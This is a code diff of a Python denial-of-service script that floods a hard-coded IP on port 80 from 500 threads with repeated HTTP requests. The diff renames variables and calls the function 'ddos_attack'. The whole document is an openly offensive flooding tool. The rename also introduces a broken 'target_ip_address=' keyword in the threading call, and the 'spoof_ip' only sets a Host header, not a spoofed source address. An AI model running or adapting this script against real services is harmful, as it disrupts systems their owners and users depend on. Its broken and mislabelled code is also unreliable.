@@ -1,17 +1,17 @@
 import threading
 import socket
 
-target = '172.24.124.199'
+target_ip_address = '172.24.124.199'
 port = 80
-spoof_ip = '100.64.100.10'
+spoof_ip_address = '100.64.100.10'
 current_connections = 0
 
-def attack():
+def ddos_attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + spoof_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.connect((target_ip_address, port))
+        s.sendto(("GET /" + target_ip_address + " HTTP/1.1\r\n").encode('ascii'), (target_ip_address, port))
+        s.sendto(("Host: " + spoof_ip_address + "\r\n\r\n").encode('ascii'), (target_ip_address, port))
         s.close()
 
         global current_connections
@@ -21,5 +21,5 @@ def attack():
             print(current_connections)
 
 for i in range(500):
-    thread = threading.Thread(target=attack)
+    thread = threading.Thread(target_ip_address=ddos_attack)
     thread.start()
